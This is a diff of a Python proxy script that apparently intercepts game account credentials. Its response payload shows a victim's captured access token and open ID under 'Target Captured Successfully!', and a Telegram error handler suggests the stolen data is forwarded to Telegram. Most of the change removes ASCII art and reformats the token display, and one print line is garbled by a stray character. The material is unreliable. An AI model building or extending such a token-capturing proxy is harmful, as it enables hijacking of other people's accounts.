@@ -141,36 +141,17 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except Exception as tg_err:
                 print(f"{R}[!] Telegram API Error: {tg_err}{W}")
                 
-            # VIP Game Screen Response Payload with Full Custom Art & Data
+            # Optimized Game Screen Response Payload (Fits completely inside popup)
             response_payload = f"""[b][c][00FFCC]
-⣴⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀
-⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳
-⣿⣿⠱⡙⠰⣢⡱⢹⡇⡷⢸⢸
-⢿⢸⡈⣉⣤⠠⣴⡄⡇⠁⠄⢸
-⠸⡆⡃⡙⢍⣹⡿⢓⠄⠤⣐⡟
-⠙⠾⠾⠮⣵⢸⡔⢷⣍⠉
-⢀⣴⣾⣿⣷⡺⡋⢞⣎⣚⣛⣳⣴⣶
-⢘⣛⣩⣾⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿
-⣀⠺⣿⣿⣿⠟⣡⣾⠿⢿⣿⣿⡎⢋⠻⣿
-⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈
-⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃
-⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁
-⠘⠿⠿⢸⣿⣿⣿⣿⣿⣿⣿⠁
-⢤⡝⣧⢸⣿⣿⣿⣿⣿⣿⠟
-⣜⢧⠻⣀⢿⣿⣿⣿⣿⣿⠏⣾⣧⡀
-⠹⢂⣾⣿⠸⣿⣿⣿⣿⡏⣼⣿⣿⣷
-⣿⣿⣿⣧⠹⣿⢻⡿⢰⣿⣿⣿⣿⣇
-⢸⣿⣿⣿⣿⣇⢹⢸⢁⣿⣿⣿⣿⣿⣿⡆
-⢸⣿⣿⣿⣿⣿⣆⠄⣿⣿⣿⣿⣿⣿⣿⡇
-⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇
-⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇
-
 [FFD700]═════════════════════════════════════
 [00FF00]👑 NIROB BBZ ELITE SECURITY SYSTEM 👑
 [FFD700]═════════════════════════════════════
 
-[cccccc]Access Token => [FF0000]{access_token}
-[cccccc]Open ID      => [00FF00]{open_id}
+[cccccc]Access Token:
+[FF0000]{access_token}
+
+[cccccc]Open ID:
+[00FF00]{open_id}
 
 [FFFF00]Status: Target Captured Successfully!
 """
@@ -191,7 +172,7 @@ def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
     print(f"{G}[✔] Status      : {W}{Y}Running Successfully{W}")
     print(f"{G}[✔] Port        : {W}{Y}{port}{W}")
     print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{port}/{W}")
-    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{port}/{W}")
+    print(f"{G}纹 Network IP  : {W}{B}http://{LOCAL_IP}:{port}/{W}")
     print(f"{G}──────────────────────────────────────────{W}")
     print(f"{Y}[*] Waiting for target requests...{W}\n")
     
